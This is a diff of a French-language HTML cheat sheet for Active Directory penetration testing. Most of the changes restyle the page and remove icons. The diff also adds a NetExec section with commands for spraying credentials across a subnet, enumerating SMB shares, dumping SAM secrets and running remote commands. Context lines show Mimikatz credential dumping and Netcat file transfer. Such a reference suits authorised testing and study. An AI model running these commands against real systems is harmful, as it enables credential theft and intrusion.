@@ -3,18 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Zephyr - Tools & Attacks</title>
+  <title>Tales of the Forest</title>
   <style>
     body {
       margin: 0;
       display: flex;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #0d1117;
-      color: #ffffff;
+      background-color: #0d0f0e; /* Noir profond */
+      color: #d4d4d4; /* Gris clair pour le texte */
     }
     .sidebar {
       width: 260px;
-      background-color: #0d1117;
+      background-color: #161a1a; /* Noir légèrement plus clair */
       height: 100vh;
       overflow-y: auto;
       padding: 1rem;
@@ -22,7 +22,7 @@
       position: fixed;
     }
     .sidebar h2 {
-      color: #ffffff;
+      color: #ff4d4d; /* Rouge vif pour les titres */
       font-size: 1rem;
       margin-bottom: 1rem;
     }
@@ -34,11 +34,11 @@
       margin-bottom: 0.7rem;
     }
     .sidebar ul li a {
-      color: #c9d1d9;
+      color: #a6e22e; /* Vert vif pour les liens */
       text-decoration: none;
     }
     .sidebar ul li a:hover {
-      color: #58a6ff;
+      color: #ff4d4d; /* Rouge vif au survol */
     }
     .main-content {
       margin-left: 260px;
@@ -46,15 +46,16 @@
       width: 100%;
     }
     .tool-entry {
-      background: #161b22;
+      background: #161a1a; /* Noir légèrement plus clair */
       border: 1px solid #30363d;
       padding: 1.2rem;
       border-radius: 6px;
       margin-bottom: 2rem;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); /* Lueur verte subtile */
     }
     .tool-entry h3 {
       margin-top: 0;
-      color: #58a6ff;
+      color: #ff4d4d; /* Rouge vif pour les sous-titres */
     }
     .container {
   margin-left: 260px;
@@ -84,21 +85,38 @@ h1 {
   height: auto;
   display: block;
   margin: 0 auto;
+  border: 2px solid #ff4d4d; /* Bordure rouge autour de l'image */
+  border-radius: 8px;
 }
 pre code {
   display: block;
-  background-color: #0d1117;   /* Fond type terminal */
-  color: #00ff00;              /* Texte vert */
+  background-color: #0d0f0e; /* Fond noir profond */
+  color: #a6e22e; /* Texte vert vif */
   font-family: 'Courier New', Courier, monospace;
   padding: 1rem;
   border-radius: 8px;
   margin-top: 1rem;
   margin-bottom: 1rem;
   overflow-x: auto;
-  box-shadow: inset 0 0 10px #00ff00;
-  border: 1px solid #00ff00;
+  box-shadow: inset 0 0 10px #a6e22e; /* Lueur verte interne */
+  border: 1px solid #a6e22e;
+}
+a {
+  color: #a6e22e; /* Vert vif pour les liens */
+  text-decoration: none;
 }
 
+a:hover {
+  color: #ff4d4d; /* Rouge vif au survol */
+}
+
+.tool-icon {
+  width: 60px;
+  height: 60px;
+  margin-bottom: 1rem;
+  border: 2px solid #ff4d4d; /* Bordure rouge autour des icônes */
+  border-radius: 50%;
+}
 
   </style>
 </head>
@@ -117,6 +135,7 @@ pre code {
             <li><a href="#sweetpotato">SweetPotato</a></li>
             <li><a href="#powerupsql">PowerUpSQL</a></li>
             <li><a href="#netcat">Netcat</a></li>
+            <li><a href="#netexec">NetExec</a></li>
         </ul>
     </div>
 
@@ -128,8 +147,8 @@ pre code {
             </a>
         </div>
         <header class="banner">
-            <img src="4pKBikrxrg0SuJSGGQTykn7DLHzMdcYh.webp"  class="banner-image" alt="Zephyr Banner" />
-            <h1>Zephyr - Tools & Attacks</h1>
+            <img src="AD_Pentest.png"  class="banner-image" alt="Zephyr Banner" />
+            <h1>Pentest Directory</h1>
         </header>
 
         <section class="tool-section">
@@ -194,7 +213,6 @@ exploit
             
 
             <div class="tool-entry" id="whisker">
-                <img src="img/whisker.png" alt="Whisker" class="tool-icon">
                 <div>
                     <h2>Whisker</h2>
                     <p>Whisker est un outil permettant de générer des certificats malveillants pour exploiter les failles des services ADCS (Active Directory Certificate Services).</p>
@@ -214,7 +232,6 @@ exploit
             </div>
 
             <div class="tool-entry" id="powerview">
-                <img src="img/powerview.png" alt="PowerView" class="tool-icon">
                 <div>
                     <h2>PowerView</h2>
                     <p>Enumération Active Directory, groupes, membres, et privilèges utilisateurs via PowerShell.</p>
@@ -267,7 +284,6 @@ exploit
             
 
             <div class="tool-entry" id="powermad">
-                <img src="img/powermad.png" alt="PowerMad" class="tool-icon">
                 <div>
                     <h2>PowerMad</h2>
                     <p>PowerMad est un module PowerShell permettant de créer des comptes machine et de manipuler les ACLs Active Directory pour des attaques de délégation de privilèges.</p>
@@ -288,7 +304,6 @@ New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureStri
             </div>
 
             <div class="tool-entry" id="impacket">
-                <img src="img/impacket.png" alt="Impacket" class="tool-icon">
                 <div>
                     <h2>Impacket</h2>
                     <p>Impacket est une collection de scripts Python permettant d'exploiter divers protocoles réseau comme SMB, RPC, et WinRM pour des attaques post-exploitation.</p>
@@ -308,7 +323,6 @@ New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureStri
             </div>
 
             <div class="tool-entry" id="evil-winrm">
-                <img src="img/evilwinrm.png" alt="Evil-WinRM" class="tool-icon">
                 <div>
                     <h2>Evil-WinRM</h2>
                     <p>
@@ -335,7 +349,6 @@ New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureStri
                 </div>
             </div>            
             <div class="tool-entry" id="meterpreter-shell">
-                <img src="img/metasploit.png" alt="Metasploit" class="tool-icon">
                 <div>
                     <h2>Metasploit - Session Meterpreter via Evil-WinRM</h2>
                     <p>
@@ -364,7 +377,6 @@ New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureStri
             </div>
             
             <div class="tool-entry" id="mimikatz">
-                <img src="img/mimikatz.png" alt="Mimikatz" class="tool-icon">
                 <div>
                     <h2>Mimikatz</h2>
                     <p>Mimikatz est un outil puissant pour extraire des informations d'identification, comme les mots de passe en clair, les hashes NTLM, et les tickets Kerberos. Il est souvent utilisé pour des attaques post-exploitation.</p>
@@ -385,7 +397,6 @@ sekurlsa::logonpasswords</code></pre>
             </div>
 
             <div class="tool-entry" id="sweetpotato">
-                <img src="img/sweetpotato.png" alt="SweetPotato" class="tool-icon">
                 <div>
                     <h2>SweetPotato</h2>
                     <p>SweetPotato exploite le privilège SeImpersonatePrivilege pour obtenir une élévation de privilèges sur les systèmes Windows.</p>
@@ -401,7 +412,6 @@ sekurlsa::logonpasswords</code></pre>
             </div>
 
             <div class="tool-entry" id="powerupsql">
-                <img src="img/powerupsql.png" alt="PowerUpSQL" class="tool-icon">
                 <div>
                     <h2>PowerUpSQL</h2>
                     <p>PowerUpSQL est un outil d'audit SQL Server qui permet d'identifier les failles de sécurité et d'exploiter les privilèges SQL.</p>
@@ -421,7 +431,6 @@ sekurlsa::logonpasswords</code></pre>
             </div>
 
             <div class="tool-entry" id="netcat">
-                <img src="img/netcat.png" alt="Netcat" class="tool-icon">
                 <div>
                     <h2>Netcat</h2>
                     <p>Netcat est un outil polyvalent pour établir des connexions réseau, souvent utilisé pour les reverse shells et les transferts de fichiers.</p>
@@ -443,6 +452,36 @@ nc 192.168.23.11 1234 < file_to_send.txt</code></pre>
                     <p>➡️ Ces commandes transfèrent "file_to_send.txt" d'une machine à une autre.</p>
                 </div>
             </div>
+            <div class="tool-entry" id="netexec">
+                <div>
+                    <h2>NetExec</h2>
+                    <p>
+                        NetExec (anciennement CrackMapExec) est un outil redoutable pour automatiser l'audit de sécurité des environnements Active Directory. 
+                        Il permet d’effectuer des actions comme la validation de mots de passe, l’exécution de commandes à distance, l’énumération des partages SMB ou encore la récupération de données sensibles.
+                    </p>
+            
+                    <h3>🎯 Exemple 1 : Authentification sur un domaine SMB</h3>
+                    <pre><code>netexec smb 192.168.0.10/24 -u admin -p 'Password123!'</code></pre>
+                    <p>➡️ Teste les identifiants sur toutes les machines du sous-réseau via le protocole SMB.</p>
+            
+                    <h3>🎯 Exemple 2 : Enumération des partages SMB</h3>
+                    <pre><code>netexec smb 192.168.0.10 -u user -p 'pass' --shares</code></pre>
+                    <p>➡️ Affiche tous les partages accessibles pour l’utilisateur fourni.</p>
+            
+                    <h3>🎯 Exemple 3 : Dump des secrets via SAM</h3>
+                    <pre><code>netexec smb 192.168.0.10 -u admin -p 'Password123!' --sam</code></pre>
+                    <p>➡️ Tente d’extraire les secrets SAM locaux si les droits le permettent.</p>
+            
+                    <h3>🎯 Exemple 4 : Exécution de commande à distance</h3>
+                    <pre><code>netexec smb 192.168.0.10 -u admin -p 'Password123!' -x 'whoami'</code></pre>
+                    <p>➡️ Exécute la commande spécifiée sur la cible distante en utilisant les services Windows valides.</p>
+            
+                    <!-- 🔗 Lien GitHub -->
+                    <p style="margin-top: 1rem;">
+                        🔗 <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" style="color:#58a6ff; font-weight:bold;">NetExec sur GitHub</a>
+                    </p>
+                </div>
+            </div>            
         </section>
     </div>
 </body>
